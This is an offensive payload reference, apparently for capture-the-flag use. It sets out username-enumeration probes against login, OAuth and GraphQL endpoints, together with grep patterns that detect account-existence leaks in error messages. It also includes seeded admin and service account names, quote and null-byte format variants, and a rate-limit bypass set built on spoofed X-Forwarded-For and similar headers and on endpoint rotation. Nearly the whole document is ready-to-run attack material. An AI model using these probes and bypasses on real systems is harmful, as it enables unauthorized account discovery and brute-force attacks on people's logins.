# Payload patterns — the grep patterns and probe bodies

## The request-body patterns

```bash
# form-encoded username slots
'user={U}&pass=x'        'username={U}&password=x'     'email={U}&pass=x'
'login={U}&pwd=x'        'name={U}&pass=x'             'account={U}&pass=x'
'uid={U}&pass=x'         'login_id={U}&pass=x'         'handle={U}&pass=x'
'identifier={U}&pass=x'  'sub={U}&pass=x'              'principal={U}&pass=x'

# JSON slots
'{"username":"{U}","password":"x"}'  '{"email":"{U}","pass":"x"}'
'{"login":"{U}","pwd":"x"}'          '{"identifier":"{U}","password":"x"}'

# OAuth/token
'grant_type=password&username={U}&password=x&client_id=x'

# GraphQL
'{"query":"mutation{login(username:\"{U}\",password:\"x\"){token}}"}'
'{"query":"query{userByEmail(email:\"{U}\"){id}}"}'
'{"query":"query{checkUser(username:\"{U}\"){exists}}"}'
```

## The error-message grep patterns

```bash
grep -oiE '(no such|not found|does not exist|unknown|invalid|incorrect|wrong|taken|already|exist|registered|locked|disabled|pending|awaiting)[^<"]*' resp
grep -oE '"(error|message|reason|code|detail|status|exists|available|taken)"\s*:\s*[^,}]*' resp
grep -oE 'error[_-]?(code|id|num)["'"'"' :=]+[0-9]+' resp
```

## The seeded-name list

```
admin administrator root test demo user guest ctf flag service
backup deploy jenkins gitlab ci bot system support operator
monitoring prometheus grafana nexus sonar vault consul ansible
puppet chef terraform kubernetes docker registry ci-cd
superuser sa oracle mysql postgres mssql redis mongo www-data
apache nginx ubuntu debian centos alpine
```

Plus: own account, challenge-named users, app-leaked names (bundle
`username`/`author`/`created_by`/`currentUser`, git author, source
`admin_user=`/`INSERT INTO users`).

## The fake-name set

```
zzz-<rand8>  qqq-<rand8>  xqz-notreal-<rand>  thisuserdoesnotexist-<rand>
```

Two different fakes — the second-bad check needs a different string.

## The format variants

```
admin   admin@corp.com   ADMIN   Admin   corp\admin   admin.corp
a.admin   admin_x   admin'   "admin"   admin\x00
```

## The throttle-bypass set

```bash
# headers
X-Forwarded-For X-Real-IP X-Client-IP X-Originating-IP X-Remote-IP
X-Remote-Addr CF-Connecting-IP True-Client-IP Forwarded Fastly-Client-IP
# endpoints
/login /login/ /api/login /api/v1/login /api/v2/login /auth /api/auth
/signin /session /token /oauth/token /api/token
# methods/params
GET vs POST   form vs JSON   user= vs username= vs email=   /LOGIN
```
